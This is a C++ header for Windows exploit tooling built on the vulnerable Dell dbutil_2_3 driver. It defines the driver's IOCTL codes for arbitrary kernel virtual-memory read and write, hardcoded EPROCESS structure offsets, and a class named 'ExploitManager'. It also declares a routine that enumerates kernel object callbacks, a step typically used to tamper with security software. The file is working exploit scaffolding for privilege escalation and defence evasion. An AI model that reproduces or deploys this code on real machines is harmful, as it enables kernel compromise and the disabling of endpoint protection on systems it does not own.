#pragma once
// C++ Standard Libraries
//#include <iostream> // maybe conflicts here
#include <algorithm>
#include <vector>
#include <string>
#include <tchar.h>
// Native Windows Libraries
#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#pragma comment(lib, "Dbghelp.lib")
// Generic Definitions
#define SYSTEM_PROCESSID 0x4
#define SYSTEM_NAME "System"
// EPROCESS Offsets
#define EPROCESS_PROCeSSID 0x440
#define EPROCESS_ACTIVEPROCESSLINKS 0x448
#define EPROCESS_DIRECTORYTABLEBASE 0x28
#define EPROCESS_NAME 0x5A8
#define EPROCESS_MAX_NAME_SIZE 0xFF
// Size of the parameters/header of each IOCTL packet/buffer
#define VIRTUAL_PACKET_HEADER_SIZE 0x18
#define PHYSICAL_PACKET_HEADER_SIZE 0x10
#define PARAMETER_SIZE 0x8
#define GARBAGE_VALUE 0xDEADBEEF
// IOCTL Codes for dbutil Driver Dispatch Methods
#define IOCTL_VIRTUAL_READ		0x9B0C1EC4
#define IOCTL_VIRTUAL_WRITE		0x9B0C1EC8

#define UNICODE 1
#define _UNICODE 1
#define wszDrive L"\\\\.\\dbutil_2_3"

class DBUTIL {
public:
	HANDLE DriverHandle;
	DBUTIL();
	~DBUTIL();
	// Virtual Kernel Memory Read Primitive
	BOOL VirtualRead(_In_ DWORD64 address, _Out_ void* buffer, _In_ size_t bytesToRead);
	// Virtual Kernel Memory Write Primitive
	BOOL VirtualWrite(_In_ DWORD64 address, _In_ void* buffer, _In_ size_t bytesToWrite);

	DWORD64 GetKernelBase(_In_ std::string name);

	VOID ReadMemory(DWORD64 Address, PVOID Buffer, SIZE_T Size) {
		VirtualRead(Address, Buffer, Size);
	}

	VOID WriteMemory(DWORD64 Address, PVOID Buffer, SIZE_T Size) {
		VirtualWrite(Address, Buffer, Size);
	}
};

// ENUM DEFS
#define DECLARE_OFFSET(STRUCTNAME, OFFSETNAME) DWORD64 Offset_ ## STRUCTNAME ## _ ## OFFSETNAME
#define DECLARE_SYMBOL(SYMBOL) DWORD64 Sym_ ## SYMBOL
//#define DECLARE_SYMBOL_CI(SYMBOL) DWORD64 Sym_Ci ## SYMBOL
void EnumAllObjectsCallbacks(DBUTIL* ExploitManager, DWORD64 ntoskrnlBaseAddress);
// END
